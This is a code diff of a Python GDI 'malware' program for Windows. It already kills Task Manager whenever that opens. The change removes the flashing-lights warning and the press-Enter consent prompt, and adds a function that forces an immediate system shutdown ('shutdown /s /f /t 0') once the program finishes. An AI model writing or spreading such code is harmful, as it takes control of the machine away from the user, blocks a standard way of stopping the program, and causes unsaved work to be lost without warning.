@@ -12,6 +12,7 @@ from ctypes import wintypes
 import os
 import psutil
 
+
 # =================== Task Manager Detection ===================
 def check_and_kill_taskmgr():
     for proc in psutil.process_iter(['name']):
@@ -32,11 +33,8 @@ def start_taskmgr_monitor():
 
 thread = start_taskmgr_monitor()
 
-
-pyfiglet.print_figlet("CARBONMONOXIDE", font="ansi_shadow", colors="CYAN")
-
-print("My first GDI malware. Flashing lights warning!")
-input("Press Enter to continue...")
+def final_kill():
+    os.system("shutdown /s /f /t 0")
 
 
 # =================== Setup DPI ===================
@@ -450,3 +448,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+    final_kill()  # Shutdown after main loop ends
